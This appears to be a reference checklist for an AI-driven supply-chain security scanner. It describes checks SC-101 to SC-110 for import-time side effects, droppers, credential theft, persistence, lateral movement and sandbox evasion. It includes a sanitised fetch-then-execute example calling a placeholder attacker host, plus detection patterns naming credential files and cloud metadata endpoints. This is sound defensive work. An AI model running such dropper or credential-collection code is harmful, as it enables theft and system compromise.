# Supply chain security checks (Tier 2 / `--deep`)

Load this reference when the project has a `package.json`, `requirements.txt`, `pom.xml`, or other dependency manifest. These checks complement the Tier 1 deterministic supply-chain checks (`lifecycle-scripts`, `unpinned-prod-deps`, `missing-lockfile`, `tracked-secret-files`, `install-script-deps`) with semantic analysis the LLM is uniquely good at.

## Threat model

Supply-chain attackers compromise a legitimate package and ship a malicious version (durabletask PyPI compromise, Mistral AI, LiteLLM, @antv). The payload usually:

1. Runs at **import time** or **install time** (not when called) so the developer just needs to install/import to be compromised
2. Uses **try/except: pass** style error suppression so nothing surfaces in logs
3. Downloads a **second-stage payload** from a C2 server (often a domain registered days before)
4. **Steals credentials** from the local filesystem, environment, cloud metadata, password managers
5. **Establishes persistence** via systemd, scheduled tasks, or shell init files
6. **Propagates** via AWS SSM, Kubernetes exec, SSH

The LLM checklist below targets the bridging step between "innocent looking package" and "exfiltrated credentials".

## Checks the LLM should perform on `--deep`

### SC-101 — Module-load / import-time side effects

Look in source files for code that runs at module load that:

- Issues outbound HTTP/HTTPS requests
- Writes to `/tmp`, `~/.cache`, `/var/tmp`, `$LOCALAPPDATA\Temp`
- Spawns subprocesses (`subprocess.Popen`, `child_process.spawn`, `os.system`, `exec`, `eval`)
- Reads environment variables matching `*TOKEN*`, `*SECRET*`, `*KEY*`, `*PASSWORD*`

For Azure Functions projects in particular, the entry module (`function_app.py`, `index.js`, `src/functions/*.ts`, `__init__.py`) should perform NO outbound calls and NO subprocess spawning at import time. Any such pattern is a strong signal.

Severity: **critical** if found in a third-party package or in an entry module.

### SC-102 — Fetch-then-execute patterns

Flag any code that:

- Downloads a remote file and immediately runs/imports/loads it
- Examples: `subprocess.run(['curl', url])` followed by `subprocess.run([...downloaded...])`, `urllib.request.urlretrieve(...)` followed by `exec(...)`, `fetch(url).then(r => eval(r.text()))`
- Decodes base64 or hex strings and passes them to `eval`, `exec`, `subprocess`, `Function()`, `vm.runInThisContext()`

These are the **dropper pattern** from the durabletask attack. The example below uses placeholder hostnames and filenames; the real attack used a freshly-registered domain pretending to be a git-related service and a Python ZIP-app payload.

```python
# Pattern (sanitised — DO NOT use real IOCs in documentation,
# anti-malware engines flag them).
urllib.request.urlretrieve("https://<ATTACKER-HOST>/<PAYLOAD>", "/tmp/<STAGE2>")
subprocess.Popen(["python3", "/tmp/<STAGE2>"], start_new_session=True)
```

Severity: **critical**.

### SC-103 — Silent error suppression around suspicious operations

`try: ... except: pass` (Python) or `try { ... } catch {}` (JS/TS) wrapping network calls, file writes, or subprocess spawns is a classic stealth technique — the attacker wants the package to "just work" even when the payload fails.

Severity: **high** when combined with SC-101 or SC-102 in the same file; **medium** otherwise.

### SC-104 — Hardcoded C2-like URLs or IPs

Look for hostnames or IPs that:

- Are not Azure (`*.azure.com`, `*.azurewebsites.net`), Microsoft (`*.microsoft.com`), or well-known public APIs (`api.github.com`, `googleapis.com`, etc.)
- Are raw IPs (especially in unusual ranges)
- Use freshly-registered TLDs or numeric subdomains
- Are referenced only in modular-load code or string constants assembled from concatenation

Severity: **high** when the host is contacted at import/install time, **medium** in handler code (still worth investigating).

### SC-105 — Credential collection patterns

Flag code that systematically reads files from any of these locations:

- `~/.aws/credentials`, `~/.azure/accessTokens.json`, `~/.config/gcloud/`
- `~/.ssh/`, `~/.kube/config`
- `~/.npmrc`, `~/.pypirc`, `~/.cargo/credentials`, `~/.docker/config.json`
- `~/.bash_history`, `~/.zsh_history`
- Browser session DBs, password manager DBs
- All `.env` files via recursive glob

Or that walks environment variables matching `*PASS*`, `*SECRET*`, `*TOKEN*`, `*KEY*`.

Or that calls cloud instance metadata services (`169.254.169.254`, IMDSv2 endpoints, `metadata.google.internal`).

Severity: **critical**.

### SC-106 — Persistence installation

Flag code that:

- Writes to `~/.config/systemd/user/`, `~/.local/share/systemd/`
- Modifies `~/.bashrc`, `~/.zshrc`, `~/.profile`
- Creates Windows scheduled tasks via `schtasks` or `Register-ScheduledTask`
- Installs cron jobs via `crontab -e` or writes to `/etc/cron.d/`
- Creates launchd plists on macOS

Severity: **critical**.

### SC-107 — Lateral movement primitives

Flag code that:

- Calls `aws ssm send-command` programmatically with `AWS-RunShellScript`
- Calls `kubectl exec` programmatically on pods other than the current one
- Iterates over SSH known_hosts and attempts connections
- Spawns processes inside Docker containers via the Docker socket

Severity: **critical**.

### SC-108 — Anti-analysis / sandbox evasion

Flag code that conditionally executes based on:

- Locale checks (`LANG`, `LC_ALL` — e.g. exit if `ru_RU`)
- Timezone checks (e.g. exit if Moscow timezone, or only run in target geographies)
- CPU count checks (exit if `cpu_count <= 2`)
- Username checks (`getuser()` against `analyst`, `sandbox`, `vagrant`)
- Process name checks (`ps -ef` looking for debuggers)

Severity: **critical**. Legitimate Azure Functions code never needs these guards.

### SC-109 — Hardcoded secrets in source

Flag any of:

- API keys, tokens, JWTs in string literals (`/[A-Za-z0-9_-]{40,}/` patterns near `key`, `token`, `secret`, `password` variable names)
- AWS access key IDs (`AKIA[0-9A-Z]{16}`) or secret access keys
- Azure storage account keys (long base64 strings) outside `local.settings.json`
- Database connection strings with embedded passwords
- Private keys (`-----BEGIN ... PRIVATE KEY-----`)

Severity: **critical**.

### SC-110 — Suspicious version downgrade or pinning of indirect deps

Flag any of:

- `package.json` overrides/resolutions that downgrade a dep below the package-lock version
- `requirements.txt` with `==` pins on inner deps that aren't direct
- `pyproject.toml` constraints pinning transitive deps to specific (possibly malicious) versions

This is how attackers achieve a "stuck" install of a compromised version. Severity: **high**.

## Output schema

For each finding produced from this checklist, use:

```json
{
  "id": "SC-101" | "SC-102" | ...,
  "category": "security" | "supply-chain",
  "severity": "critical" | "high" | "medium",
  "status": "fail" | "warn",
  "title": "<short label>",
  "message": "<what was found, where, why it's suspicious>",
  "file": "<relative path>",
  "line": <line number if exact>,
  "recommendation": "<concrete fix or investigation step>"
}
```

## False positives to avoid

- Modules that legitimately spawn subprocesses to drive `func`/`az`/external CLIs **at runtime in handlers** (not at import time) are normal.
- Modules that read `process.env` for known Azure Functions settings (`AzureWebJobsStorage`, `FUNCTIONS_WORKER_RUNTIME`, etc.) are normal.
- Dev dependencies with native builds (`sharp`, `puppeteer`, `bcrypt`) need install scripts and are not malicious by themselves — focus on prod deps.
- Locale/timezone checks for legitimate internationalization (formatting dates) are not anti-analysis.

## Cross-reference

- Tier 1 deterministic checks: `lifecycle-scripts`, `unpinned-prod-deps`, `missing-lockfile`, `tracked-secret-files`, `install-script-deps` in `src/doctor/checks.ts`
- Background: StepSecurity analysis of the durabletask PyPI compromise (May 19, 2026)
- Generic guidance: [SLSA framework](https://slsa.dev/), npm provenance, PyPI Trusted Publishing
